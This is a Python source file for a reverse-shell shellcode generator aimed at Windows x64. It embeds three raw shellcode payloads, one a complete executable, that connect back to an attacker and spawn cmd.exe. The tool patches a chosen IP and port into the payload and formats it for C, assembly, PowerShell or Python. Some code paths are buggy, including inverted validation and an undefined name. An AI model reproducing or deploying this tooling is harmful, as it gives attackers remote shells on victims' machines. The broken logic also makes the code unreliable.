import argparse
import os

#             ____       __        __             __         ____
#      ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
#     / __ \/ / / / ___/ //_/ _ \/ __/_____/ ___/ __ \/ _ \/ / / 
#    / /_/ / /_/ / /__/ ,< /  __/ /_/_____(__  ) / / /  __/ / /  
#   / .___/\____/\___/_/|_|\___/\__/     /____/_/ /_/\___/_/_/   
#  /_/
#  Author: SilentisVox
#  Github: https://github.com/SilentisVox/p0cket-shell

class Generator:
        def __init__(self,
                payload                 : str,
                callback_addr           : tuple[str, str],
                f                       : str = "raw"
        ) -> None:
                self.payload            = payload
                self.callback_addr      = callback_addr
                self.format             = f
                self.output             = """
                        \r[i] {}
                        \r[*] Total size: {}
                        \r[*] Selecting {} ...
                """

        def make(self) -> dict:
                if self.validate():
                        return
                
                formatters              = {
                        "asm"           : self.asm,
                        "c"             : self.c,
                        "powershell"    : self.powershell,
                        "ps1"           : self.powershell,
                        "python"        : self.python,
                        "py"            : self.python,
                        "raw"           : self.raw
                }       
                payload                 = self.format_payload()
                return payload, formatters[self.format.lower()](payload)

        def validate(self) -> bool:
                if self.payload.lower() not in ["hardcode", "resolve", "single"]:
                        return False
                
                if self.callback_addr.count(".") != 3:
                        return False

                for octet in self.callback_addr[0].split("."):
                        if int(octet) not in range(255):
                                return False

                if int(self.callback_addr[1]) not in range(65536):
                        return False

                return True

        def format_payload(self) -> dict:
                payloads                = {
                        "hardcode"      : Payload.hardcode,
                        "resolve"       : Payload.resolve,
                        "single"        : Payload.single
                }
                payload                 = payloads[self.payload]
                address                 = self.conv_addr(self.callback_addr[0], self.callback_addr[1])
                payload["Payload"]["Shellcode"][payload["Payload"]["Offsets"]["Address"] : payload["Payload"]["Offsets"]["Address"] + 6] = address

                return payload

        def conv_addr(self, ip: str, port: str) -> bytearray:
                address_bytes           = bytearray(6)
                address_bytes[0:2]      = int(port).to_bytes(2)
                address_bytes[2:6]      = (int(octet) for octet in ip.split("."))

                return address_bytes

        def asm(self, payload: dict) -> str:
                output                  = ""
                byte_index              = 0

                while byte_index < len(payload["Payload"]["Shellcode"]):
                        if byte_index == len(payload["Payload"]["Shellcode"]) and (byte_index + 1) % 12 == 0:
                                output += f'\n        db 0x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if byte_index == len(payload["Payload"]["Shellcode"]) - 1:
                                output += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if byte_index % 12 == 0:
                                output += f'\n        db 0x{payload["Payload"]["Shellcode"][byte_index]:02x}, '
                                byte_index     += 1
                                continue

                        if (byte_index + 1) % 12 == 0:
                                output += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        output         += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}, '
                        byte_index     += 1

                return output + "\n"
        
        def c(self, payload: dict) -> str:
                output                  = f'BYTE Shellcode[{len(payload["Payload"]["Shellcode"])}] = ' + '{'
                byte_index              = 0

                while byte_index < len(payload["Payload"]["Shellcode"]):
                        if byte_index == len(payload["Payload"]["Shellcode"]) and (byte_index + 1) % 12 == 0:
                                output += f'\n        0x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if byte_index == len(payload["Payload"]["Shellcode"]) - 1:
                                output += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if byte_index % 12 == 0:
                                output += f'\n        0x{payload["Payload"]["Shellcode"][byte_index]:02x}, '
                                byte_index     += 1
                                continue

                        if (byte_index + 1) % 12 == 0:
                                output += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}, '
                                byte_index     += 1
                                continue

                        output         += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}, '
                        byte_index     += 1

                return output + "\n};"
        
        def powershell(self, payload: dict) -> str:
                output                  = f'\n[byte[]] $Shellcode = @('
                byte_index              = 0

                while byte_index < len(payload["Payload"]["Shellcode"]):
                        if byte_index == len(payload["Payload"]["Shellcode"]) and (byte_index + 1) % 12 == 0:
                                output += f'\n        0x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if byte_index == len(payload["Payload"]["Shellcode"]) - 1:
                                output += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if byte_index % 12 == 0:
                                output += f'\n        0x{payload["Payload"]["Shellcode"][byte_index]:02x}, '
                                byte_index     += 1
                                continue

                        if (byte_index + 1) % 12 == 0:
                                output += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}, '
                                byte_index     += 1
                                continue

                        output         += f'0x{payload["Payload"]["Shellcode"][byte_index]:02x}, '
                        byte_index     += 1

                return output + "\n);"
        
        def python(self, payload: dict) -> str:
                output                  = f'shellcode  = b""'
                byte_index              = 0

                while byte_index < len(payload["Payload"]["Shellcode"]):
                        if byte_index == len(payload["Payload"]["Shellcode"]) and (byte_index + 1) % 12 == 0:
                                output += f'\nshellcode += b"\\x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if byte_index == len(payload["Payload"]["Shellcode"]) - 1:
                                output += f'\\x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if byte_index % 12 == 0:
                                output += f'\nshellcode += b"\\x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                                byte_index     += 1
                                continue

                        if (byte_index + 1) % 12 == 0:
                                output += f'\\x{payload["Payload"]["Shellcode"][byte_index]:02x}"'
                                byte_index     += 1
                                continue

                        output         += f'\\x{payload["Payload"]["Shellcode"][byte_index]:02x}'
                        byte_index     += 1

                return output + '"\n'
        
        def raw(self, payload: dict) -> str:
                return payload["Payload"]["Shellcode"]
        

class Payload:
        hardcode: dict = {
                "Name"          : "Windows x64 Hardcode Reverse Tcp",
                "Description"   : "Connect back to an attacker and spawn a command shell (Up-to-date Windows x64)",
                "Author"        : "SilentisVox",
                "Payload"       : {
                        "Offsets" : {
                                "Address" : 143
                        },
                        "Shellcode" : bytearray([
                                0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x65, 0x48, 0x8b, 0x04,
                                0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40,
                                0x30, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x10, 0x4c,
                                0x8d, 0xb8, 0x70, 0x4f, 0x04, 0x00, 0x4c, 0x8d, 0xb0, 0x80, 0x2d, 0x04,
                                0x00, 0x68, 0x6c, 0x6c, 0x00, 0x00, 0x48, 0xb8, 0x77, 0x73, 0x32, 0x5f,
                                0x33, 0x32, 0x2e, 0x64, 0x50, 0x48, 0x89, 0xe1, 0x48, 0x81, 0xec, 0x08,
                                0x01, 0x00, 0x00, 0x41, 0xff, 0xd6, 0x4c, 0x8d, 0xb0, 0x20, 0x40, 0x02,
                                0x00, 0x4c, 0x8d, 0xa8, 0xc0, 0xae, 0x02, 0x00, 0x4c, 0x8d, 0xa0, 0x00,
                                0xee, 0x00, 0x00, 0x66, 0xb9, 0x02, 0x02, 0x48, 0x89, 0xe2, 0x41, 0xff,
                                0xd6, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x52, 0x52,
                                0x52, 0x52, 0x52, 0x52, 0xb1, 0x02, 0xb2, 0x01, 0x41, 0xb0, 0x06, 0x41,
                                0xff, 0xd5, 0x49, 0x89, 0xc6, 0x89, 0xc1, 0x48, 0xb8, 0x02, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x48, 0x89, 0xe2, 0x41, 0xb0, 0x10,
                                0x41, 0xff, 0xd4, 0x50, 0x48, 0xb9, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78,
                                0x65, 0x00, 0x51, 0x48, 0x89, 0xe2, 0x41, 0x56, 0x41, 0x56, 0x41, 0x56,
                                0x50, 0x50, 0x48, 0x31, 0xc9, 0xb1, 0x01, 0x48, 0xc1, 0xc9, 0x18, 0x51,
                                0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x6a, 0x68, 0x48, 0x8d, 0x4c, 0x24,
                                0xe0, 0x49, 0x89, 0xe0, 0x51, 0x41, 0x50, 0x50, 0x50, 0x68, 0x00, 0x00,
                                0x00, 0x08, 0x6a, 0x01, 0x50, 0x50, 0x50, 0x50, 0x48, 0x89, 0xc1, 0x41,
                                0xff, 0xd7, 0x48, 0x81, 0xc4, 0x18, 0x02, 0x00, 0x00, 0x41, 0x5f, 0x41,
                                0x5e, 0x41, 0x5d, 0x41, 0x5c, 0xc3
                        ])
                }
        }

        resolve: dict = {
                "Name"          : "Windows x64 Resolve Reverse Tcp",
                "Description"   : "Connect back to an attacker and spawn a command shell (Windows x64)",
                "Author"        : "SilentisVox",
                "Payload"       : {
                        'Offsets' : {
                                "Address" : 277
                        },
                        "Shellcode" : bytearray([
                                0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x65, 0x48, 0x8b, 0x04,
                                0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40,
                                0x30, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x10, 0x48,
                                0x89, 0xc1, 0xba, 0xc9, 0xbc, 0xa6, 0x6b, 0xe8, 0x59, 0x00, 0x00, 0x00,
                                0x49, 0x89, 0xc7, 0xba, 0x32, 0x74, 0x91, 0x0c, 0xe8, 0x4c, 0x00, 0x00,
                                0x00, 0x49, 0x89, 0xc6, 0x68, 0x6c, 0x6c, 0x00, 0x00, 0x48, 0xb8, 0x77,
                                0x73, 0x32, 0x5f, 0x33, 0x32, 0x2e, 0x64, 0x50, 0x48, 0x89, 0xe1, 0x48,
                                0x81, 0xec, 0x08, 0x01, 0x00, 0x00, 0x41, 0xff, 0xd6, 0x48, 0x89, 0xc1,
                                0xba, 0x3d, 0x6a, 0xb4, 0x80, 0xe8, 0x1f, 0x00, 0x00, 0x00, 0x49, 0x89,
                                0xc6, 0xba, 0x2d, 0x32, 0x78, 0xde, 0xe8, 0x12, 0x00, 0x00, 0x00, 0x49,
                                0x89, 0xc5, 0xba, 0x62, 0x77, 0x57, 0xc0, 0xe8, 0x05, 0x00, 0x00, 0x00,
                                0x49, 0x89, 0xc4, 0xeb, 0x60, 0x44, 0x8b, 0x41, 0x3c, 0x4e, 0x8d, 0x04,
                                0x01, 0x45, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x4e, 0x8d, 0x04, 0x01,
                                0x45, 0x8b, 0x48, 0x18, 0x45, 0x8b, 0x50, 0x20, 0x4e, 0x8d, 0x14, 0x11,
                                0x49, 0xff, 0xc9, 0x43, 0x8b, 0x34, 0x8a, 0x48, 0x8d, 0x34, 0x31, 0x48,
                                0x31, 0xc0, 0x4d, 0x31, 0xdb, 0xac, 0x84, 0xc0, 0x74, 0x09, 0x41, 0xc1,
                                0xcb, 0x07, 0x41, 0x01, 0xc3, 0xeb, 0xf2, 0x49, 0x39, 0xd3, 0x75, 0xdc,
                                0x41, 0x8b, 0x40, 0x24, 0x48, 0x8d, 0x04, 0x01, 0x42, 0x0f, 0xb7, 0x14,
                                0x48, 0x41, 0x8b, 0x40, 0x1c, 0x48, 0x8d, 0x04, 0x01, 0x8b, 0x04, 0x90,
                                0x48, 0x8d, 0x04, 0x01, 0xc3, 0x66, 0xb9, 0x02, 0x02, 0x48, 0x89, 0xe2,
                                0x41, 0xff, 0xd6, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9,
                                0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0xb1, 0x02, 0xb2, 0x01, 0x41, 0xb0,
                                0x06, 0x41, 0xff, 0xd5, 0x49, 0x89, 0xc6, 0x89, 0xc1, 0x48, 0xb8, 0x02,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x48, 0x89, 0xe2, 0x41,
                                0xb0, 0x10, 0x41, 0xff, 0xd4, 0x50, 0x48, 0xb9, 0x63, 0x6d, 0x64, 0x2e,
                                0x65, 0x78, 0x65, 0x00, 0x51, 0x48, 0x89, 0xe2, 0x41, 0x56, 0x41, 0x56,
                                0x41, 0x56, 0x50, 0x50, 0x48, 0x31, 0xc9, 0xb1, 0x01, 0x48, 0xc1, 0xc9,
                                0x18, 0x51, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x6a, 0x68, 0x48, 0x8d,
                                0x4c, 0x24, 0xe0, 0x49, 0x89, 0xe0, 0x51, 0x41, 0x50, 0x50, 0x50, 0x68,
                                0x00, 0x00, 0x00, 0x08, 0x6a, 0x01, 0x50, 0x50, 0x50, 0x50, 0x48, 0x89,
                                0xc1, 0x41, 0xff, 0xd7, 0x48, 0x81, 0xc4, 0x18, 0x02, 0x00, 0x00, 0x41,
                                0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0xc3
                        ])
                }
        }

        single: dict = {
                "Name"          : "Windows x64 Resolve Reverse Tcp",
                "Description"   : "Connect back to an attacker and spawn a command shell (Up-to-date Windows x64 Executable)",
                "Author"        : "SilentisVox",
                "Payload"       : {
                        'Offsets' : {
                                "Address" : 282
                        },
                        "Shellcode" : bytearray([
                                0x4d, 0x5a, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x00, 0x00,
                                0x73, 0x69, 0x6c, 0x65, 0x6e, 0x74, 0x69, 0x73, 0x00, 0x00, 0x00, 0x00,
                                0x80, 0x00, 0x22, 0x00, 0x0b, 0x02, 0x00, 0x00, 0xcf, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
                                0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x6b, 0x01, 0x00, 0x00, 0x8b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40,
                                0x18, 0x48, 0x8b, 0x40, 0x30, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x48,
                                0x8b, 0x40, 0x10, 0x4c, 0x8d, 0xb8, 0x70, 0x4f, 0x04, 0x00, 0x4c, 0x8d,
                                0xb0, 0x80, 0x2d, 0x04, 0x00, 0x68, 0x6c, 0x6c, 0x00, 0x00, 0x48, 0xb8,
                                0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x2e, 0x64, 0x50, 0x89, 0xe1, 0x81,
                                0xec, 0xa8, 0x01, 0x00, 0x00, 0x41, 0xff, 0xd6, 0x4c, 0x8d, 0xb0, 0x20,
                                0x40, 0x02, 0x00, 0x4c, 0x8d, 0xa8, 0xc0, 0xae, 0x02, 0x00, 0x4c, 0x8d,
                                0xa0, 0x00, 0xee, 0x00, 0x00, 0x66, 0xb9, 0x02, 0x02, 0x89, 0xe2, 0x41,
                                0xff, 0xd6, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0xb1, 0x02, 0xba, 0x01,
                                0x00, 0x00, 0x00, 0x41, 0xb0, 0x06, 0x41, 0xff, 0xd5, 0x49, 0x89, 0xc6,
                                0x89, 0xc1, 0x48, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x50, 0x89, 0xe2, 0x41, 0xb0, 0x10, 0x41, 0xff, 0xd4, 0x50, 0x48, 0xb9,
                                0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x51, 0x89, 0xe2, 0x41,
                                0x56, 0x41, 0x56, 0x41, 0x56, 0x50, 0x50, 0x48, 0x31, 0xc9, 0xb1, 0x01,
                                0x48, 0xc1, 0xc9, 0x18, 0x51, 0x83, 0xec, 0x30, 0x6a, 0x68, 0x48, 0x8d,
                                0x4c, 0x24, 0xe0, 0x49, 0x89, 0xe0, 0x51, 0x41, 0x50, 0x50, 0x50, 0x68,
                                0x00, 0x00, 0x00, 0x08, 0x6a, 0x01, 0x50, 0x50, 0x50, 0x50, 0x89, 0xc1,
                                0x41, 0xff, 0xd7
                        ])
                }
        }

def main() -> None:
        banner                              = """
        \r            ____       __        __             __         ____
        \r     ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
        \r    / __ \/ / / / ___/ //_/ _ \/ __/_____/ ___/ __ \/ _ \/ / / 
        \r   / /_/ / /_/ / /__/ ,< /  __/ /_/_____(__  ) / / /  __/ / /  
        \r  / .___/\____/\___/_/|_|\___/\__/     /____/_/ /_/\___/_/_/   
        \r /_/
        \r Author: SilentisVox
        \r Github: https://github.com/SilentisVox/p0cket-shell
        """
        print(banner)
        parser = argparse.ArgumentParser(description="Smallest Reverse Shell Shellcode Generator.")
        
        parser.add_argument("--payload", "-p", required=True, default="hardcode", choices=["hardcode", "resolve", "single"], help="Payload type.")
        parser.add_argument("--lhost", "-lh", required=True, help="Local host IP address.")
        parser.add_argument("--lport", "-lp", required=True, help="Local port number.")
        parser.add_argument("--format", "-f", required=False, default="raw", choices=["asm", "c", "powershell", "ps1", "python", "py", "raw"], help="Output format.")
        parser.add_argument("--output", "-o", help="Optional output file path.")
        args = parser.parse_args()        

        generator = Generator(args.payload, (args.lhost, args.lport), args.format)
        payload, output = generator.make()

        print(
                "[i] {} \n".format(payload["Name"]) + 
                "[*] Total Size: {} \n".format(len(payload["Payload"]["Shellcode"])) +
                "[*] Selecting {} ....".format(args.format)
        )

        if not args.output:
                print(
                        """
                        \r
                        \r{}
                """.format(output))
                return
        
        
        print("[*] Outputting to {}\n".format(args.output))

        with open(args.output, "wb") as file_handle:
                if isinstance(output, str):
                        output          = output.encode(error)

                file_handle.write(output)


if __name__ == "__main__":
        main()